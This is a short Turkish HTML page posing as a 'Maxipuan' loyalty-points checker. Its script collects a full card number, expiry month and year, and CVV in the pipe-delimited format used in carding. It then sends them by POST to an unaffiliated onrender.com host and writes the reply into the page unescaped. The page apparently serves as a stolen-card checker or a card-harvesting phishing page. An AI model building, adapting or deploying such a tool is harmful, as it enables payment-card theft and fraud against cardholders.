<!DOCTYPE html><html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Puan Sorgulama</title>
  <style>
    body { font-family: sans-serif; background: #121212; color: #fff; padding: 20px; }
    input, button, select { padding: 10px; font-size: 16px; border-radius: 5px; border: none; margin-top: 10px; width: 100%; }
    button { background: #00c853; color: white; cursor: pointer; }
    .result { margin-top: 20px; padding: 10px; background: #1e1e1e; border-radius: 5px; }
  </style>
</head>
<body>
  <h2>Maxipuan Sorgulama</h2>
  <input type="text" id="card" placeholder="Kart Bilgisi (|||| ile ayırın)">
  <button onclick="checkPoints()">Kontrol Et</button>  <div id="result" class="result"></div>  <script>
    async function checkPoints() {
      const resultBox = document.getElementById("result");
      const cardRaw = document.getElementById("card").value.trim();

      if (!cardRaw.includes("|")) {
        resultBox.innerText = "Lütfen kartı 4543xxxxxxxxxxxx|ay|yıl|cvv şeklinde girin.";
        return;
      }

      const [cc, month, year, cvv] = cardRaw.split("|");

      try {
        resultBox.innerText = "Sorgulanıyor...";
        const res = await fetch("https://hzquarex-puan.onrender.com/api/puan", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cc, month, year, cvv })
        });
        const data = await res.text();
        resultBox.innerHTML = `<strong>Sonuç:</strong><br>${data}`;
      } catch (e) {
        resultBox.innerText = "Hata oluştu: " + e.message;
      }
    }
  </script></body>
</html>
